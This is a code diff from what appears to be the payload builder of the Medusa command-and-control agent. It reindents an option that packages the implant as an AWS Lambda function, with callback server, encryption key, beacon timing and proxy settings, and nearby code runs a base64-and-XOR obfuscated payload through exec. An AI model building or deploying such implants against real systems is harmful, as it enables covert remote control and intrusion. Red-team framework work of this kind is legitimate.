@@ -183,54 +183,55 @@ exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encod
                 resp.payload = base64.b64encode(base_code.encode())
                 resp.build_message = "Successfully Built"
             elif self.get_parameter("output") == "lambda_zip":
-            # Find the start of __init__ function and truncate
+                # Find the start of __init__ function and truncate
                 init_start = base_code.find("def __init__(self):")
                 base_code = base_code[:init_start]
-                
+    
                 # Add our Lambda implementation with proper indentation
-                base_code += """    def __init__(self):
-                    self.socks_open = {}
-                    self.socks_in = queue.Queue()
-                    self.socks_out = queue.Queue()
-                    self.taskings = []
-                    self._meta_cache = {}
-                    self.moduleRepo = {}
-                    self.current_directory = '/tmp'
-                    self.agent_config = {
-                        "Server": "callback_host",
-                        "Port": "callback_port",
-                        "PostURI": "/post_uri",
-                        "PayloadUUID": "UUID_HERE",
-                        "UUID": "UUID_HERE",
-                        "Headers": headers,
-                        "Sleep": callback_interval,
-                        "Jitter": callback_jitter,
-                        "KillDate": "killdate",
-                        "enc_key": AESPSK,
-                        "ExchChk": "encrypted_exchange_check",
-                        "GetURI": "/get_uri",
-                        "GetParam": "query_path_name",
-                        "ProxyHost": "proxy_host",
-                        "ProxyUser": "proxy_user",
-                        "ProxyPass": "proxy_pass",
-                        "ProxyPort": "proxy_port",
-                    }
-                    
-                    if not self.passedKilldate():
-                        try:
-                            self.getTaskings()
-                            self.processTaskings()
-                            self.postResponses()
-                        except:
-                            pass
+                base_code += """
+    def __init__(self):
+        self.socks_open = {}
+        self.socks_in = queue.Queue()
+        self.socks_out = queue.Queue()
+        self.taskings = []
+        self._meta_cache = {}
+        self.moduleRepo = {}
+        self.current_directory = '/tmp'
+        self.agent_config = {
+            "Server": "callback_host",
+            "Port": "callback_port",
+            "PostURI": "/post_uri",
+            "PayloadUUID": "UUID_HERE",
+            "UUID": "UUID_HERE",
+            "Headers": headers,
+            "Sleep": callback_interval,
+            "Jitter": callback_jitter,
+            "KillDate": "killdate",
+            "enc_key": AESPSK,
+            "ExchChk": "encrypted_exchange_check",
+            "GetURI": "/get_uri",
+            "GetParam": "query_path_name",
+            "ProxyHost": "proxy_host",
+            "ProxyUser": "proxy_user",
+            "ProxyPass": "proxy_pass",
+            "ProxyPort": "proxy_port",
+        }
+        
+        if not self.passedKilldate():
+            try:
+                self.getTaskings()
+                self.processTaskings()
+                self.postResponses()
+            except:
+                pass
 
-            def lambda_handler(event, context):
-                medusa = medusa()
-                return {
-                    'statusCode': 200,
-                    'body': json.dumps('Medusa agent executed successfully')
-                }
-            """
+def lambda_handler(event, context):
+    medusa = medusa()
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Medusa agent executed successfully')
+    }
+"""
 
                 # Create temp directory for Lambda package
                 with tempfile.TemporaryDirectory() as temp_dir:
